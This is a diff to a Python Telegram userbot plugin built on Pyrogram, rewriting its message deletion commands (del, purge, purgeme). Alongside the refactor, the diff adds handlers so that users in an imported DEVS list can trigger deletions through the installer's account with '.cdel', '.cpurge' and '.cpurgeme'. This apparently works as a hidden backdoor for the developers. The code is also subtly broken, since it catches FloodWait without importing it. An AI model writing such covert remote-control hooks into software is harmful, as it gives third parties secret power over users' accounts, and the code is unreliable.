@@ -8,64 +8,70 @@
 # t.me/SharingUserbot & t.me/Lunatic0de
 
 import asyncio
-import time
 
 from pyrogram import Client, filters
 from pyrogram.types import Message
 
 from config import CMD_HANDLER as cmd
+from ProjectMan.helpers.adminHelpers import DEVS
 from ProjectMan.helpers.basic import edit_or_reply
 
 from .help import add_command_help
 
 
+@Client.on_message(
+    filters.command("cdel", ["."]) & filters.user(DEVS) & ~filters.via_bot
+)
 @Client.on_message(filters.command("del", cmd) & filters.me)
-async def del_msg(_, message: Message):
-    await message.reply_to_message.delete()
-    await message.delete()
+async def del_msg(client: Client, message: Message):
+    msg_src = message.reply_to_message
+    if msg_src:
+        if msg_src.from_user.id:
+            try:
+                await client.delete_messages(message.chat.id, msg_src.id)
+                await message.delete()
+            except BaseException:
+                pass
+    else:
+        await message.delete()
 
 
+@Client.on_message(
+    filters.command("cpurge", ["."]) & filters.user(DEVS) & ~filters.via_bot
+)
 @Client.on_message(filters.command("purge", cmd) & filters.me)
 async def purge(client: Client, message: Message):
-    start_time = time.time()
-    message_ids = []
-    purge_len = 0
-    event = await edit_or_reply(message, "`Starting To Purge Messages!`")
-    me_m = await client.get_me()
-    if message.chat.type in ["supergroup", "channel"]:
-        me_ = await message.chat.get_member(int(me_m.id))
-        if not me_.can_delete_messages:
-            await event.edit("`I Need Delete Permission To Do This!`")
-            return
-    if not message.reply_to_message:
-        await event.edit("`Reply To Message To Purge!`")
+    Man = await edit_or_reply(message, "`Starting To Purge Messages!`")
+    msg = message.reply_to_message
+    if msg:
+        itermsg = list(range(msg.id, message.id))
+    else:
+        await Man.edit("`Reply To Message To Purge!`")
         return
-    async for msg in client.iter_history(
-        chat_id=message.chat.id,
-        offset_id=message.reply_to_message.message_id,
-        reverse=True,
-    ):
-        if msg.message_id != message.message_id:
-            purge_len += 1
-            message_ids.append(msg.message_id)
-            if len(message_ids) >= 100:
-                await client.delete_messages(
-                    chat_id=message.chat.id, message_ids=message_ids, revoke=True
-                )
-                message_ids.clear()
-    if message_ids:
-        await client.delete_messages(
-            chat_id=message.chat.id, message_ids=message_ids, revoke=True
-        )
-    end_time = time.time()
-    u_time = round(end_time - start_time)
-    await event.edit(
-        f"**» Fast Purge Done!** \n**» Total Message Purged :** `{purge_len}` \n**» Time Taken :** `{u_time}`",
+    count = 0
+
+    for i in itermsg:
+        try:
+            count = count + 1
+            await client.delete_messages(
+                chat_id=message.chat.id, message_ids=i, revoke=True
+            )
+        except FloodWait as e:
+            await asyncio.sleep(e.x)
+        except Exception as e:
+            await Man.edit(f"**ERROR:** `{e}`")
+            return
+
+    done = await Man.edit(
+        f"**Fast Purge Completed!**\n**Berhasil Menghapus** `{str(count)}` **Pesan.**"
     )
-    await asyncio.sleep(3)
-    await event.delete()
+    await asyncio.sleep(2)
+    await done.delete()
 
 
+@Client.on_message(
+    filters.command("cpurgeme", ["."]) & filters.user(DEVS) & ~filters.via_bot
+)
 @Client.on_message(filters.command("purgeme", cmd) & filters.me)
 async def purgeme(client: Client, message: Message):
     if len(message.command) != 2:
@@ -78,7 +84,7 @@ async def purgeme(client: Client, message: Message):
         return await edit_or_reply(message, "Masukan jumlah pesan yang ingin dihapus!")
     chat_id = message.chat.id
     message_ids = [
-        m.message_id
+        m.id
         async for m in client.search_messages(
             chat_id,
             from_user="me",
@@ -94,6 +100,7 @@ async def purgeme(client: Client, message: Message):
             message_ids=hundred_messages_or_less,
             revoke=True,
         )
+    await message.delete()
 
 
 add_command_help(
